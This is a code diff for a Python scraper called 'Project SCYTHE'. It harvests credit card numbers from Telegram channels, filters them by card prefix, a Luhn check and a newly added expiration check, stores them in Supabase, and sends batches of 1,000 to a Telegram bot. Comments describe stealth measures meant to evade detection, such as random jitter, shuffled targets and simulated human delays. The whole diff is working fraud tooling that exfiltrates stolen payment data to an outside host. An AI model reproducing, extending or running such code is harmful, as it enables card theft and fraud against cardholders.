@@ -47,6 +47,27 @@ def is_luhn_valid(number):
         checksum += d
     return checksum % 10 == 0
 
+def is_card_expired(month, year):
+    """
+    Check if a card is expired based on expiration month and year.
+    """
+    current_date = datetime.utcnow()
+    current_year = current_date.year
+    current_month = current_date.month
+    
+    card_month = int(month)
+    card_year = int(year)
+    
+    if card_year < 100:
+        card_year = 2000 + card_year
+    
+    if card_year < current_year:
+        return True
+    if card_year == current_year and card_month < current_month:
+        return True
+    
+    return False
+
 async def human_delay():
     await asyncio.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
 
@@ -68,7 +89,7 @@ async def sync_to_targets(cards):
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(tmp_path, 'rb') as f:
             files = {'document': ('scythe_vectors.txt', f)}
-            caption = f"🎯 DAILY REPORT: {len(cards)} Intelligence Vectors Extracted.\n[Period: 24H | Stealth: Iron-Clad]"
+            caption = f"🎯 THRESHOLD REACHED: {len(cards)} Intelligence Vectors Extracted.\n[Batch Upload | Stealth: Iron-Clad]"
             data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
             requests.post(url, data=data, files=files)
         os.unlink(tmp_path)
@@ -92,7 +113,7 @@ def obfuscate_card_number(original):
 async def cloud_mission():
     print("--- [ Project SCYTHE: CLOUD CYCLE INITIATED ] ---")
     
-    # --- HUMAN SIMULATION PROTOCOL (SHΔDØW HUM-SIM) ---
+    # --- HUMAN SIMULATION PROTOCOL (SHÎ”DÃ˜W HUM-SIM) ---
     # Randomized Start Jitter (1-10 minutes) to avoid fixed patterns
     jitter = random.randint(60, 600)
     print(f"Shadow Initialization Jitter: Waiting {jitter}s...")
@@ -114,7 +135,7 @@ async def cloud_mission():
     
     print(f"Intelligence Grid: {len(all_dialogs)} channels with unread intel.")
     
-    # SHΔDØW HUM-SIM: Randomly shuffle targets so every cycle is different
+    # SHÎ”DÃ˜W HUM-SIM: Randomly shuffle targets so every cycle is different
     random.shuffle(all_dialogs)
     print("Targets shuffled for Stealth Recon.")
     
@@ -143,6 +164,8 @@ async def cloud_mission():
                         if not num.startswith(('4', '5')): continue
                         # Luhn Check
                         if not is_luhn_valid(num): continue
+                        # Expiration Check
+                        if is_card_expired(groups[1].strip(), groups[2].strip()): continue
                         
                         # Sanitization Protocol
                         obfuscated = obfuscate_card_number(num)
@@ -166,18 +189,16 @@ async def cloud_mission():
             state.stage_cards(new_cards)
             new_cards = []
 
-        # Inter-target delay (SHΔDØW Adaptive Stealth)
+        # Inter-target delay (SHÎ”DÃ˜W Adaptive Stealth)
         # Simulation: Moving from one channel to another after "reading"
         wait = random.uniform(45, 120) # 0.75 to 2 mins
         print(f"  > Mission Synchronized. Transitioning targets in {int(wait)}s...")
         await asyncio.sleep(wait)
 
-    # FINAL DELIVERY: Send to Bot once per day (first run of each day)
-    now = datetime.utcnow()
-    current_date = now.strftime("%Y-%m-%d")
+    # FINAL DELIVERY: Send to Bot if threshold reached
     staged = state.get_staged_cards()
     
-    # Always save to Supabase (every 3 hours)
+    # Always save to Supabase
     if staged:
         supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
         for card in staged:
@@ -186,31 +207,19 @@ async def cloud_mission():
             except: pass
         print(f"Saved {len(staged)} cards to Supabase.")
     
-    # Check if we already sent today's report
-    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
-    try:
-        res = supabase.table("system_settings").select("value").eq("key", "last_daily_report_date").single().execute()
-        last_report_date = res.data['value'] if res.data else None
-    except:
-        last_report_date = None
-    
-    # Send to Telegram Bot once per day (if we haven't sent today yet)
-    if staged and last_report_date != current_date:
-        print(f"🎯 Daily Report Time! Sending {len(staged)} cards to Telegram Bot...")
+    # Send to Telegram Bot when threshold is reached
+    if staged and len(staged) >= 1000:
+        print(f"🎯 Threshold Reached! Sending {len(staged)} cards to Telegram Bot...")
         await sync_to_targets(staged)
         state.clear_staged_cards()
-        # Record that we sent today's report
-        try:
-            supabase.table("system_settings").upsert({"key": "last_daily_report_date", "value": current_date}).execute()
-        except: pass
-        print("✅ Daily report sent successfully!")
+        print("✅ Batch report sent successfully!")
         # Unlock the scraper in Supabase for the next mission
         try:
             supabase.table("system_settings").upsert({"key": "scraper_locked", "value": "false"}).execute()
         except:
             print("Cleanup Warning: Mission completed but Supabase unlock pending due to connection glitch.")
     elif staged:
-        print(f"📊 Cards staged: {len(staged)} (will be sent in next run - daily report already sent today)")
+        print(f"📊 Cards staged: {len(staged)} (waiting to reach 1000 threshold)")
     else:
         print("Intelligence Grid Clean: No new vectors detected.")
 
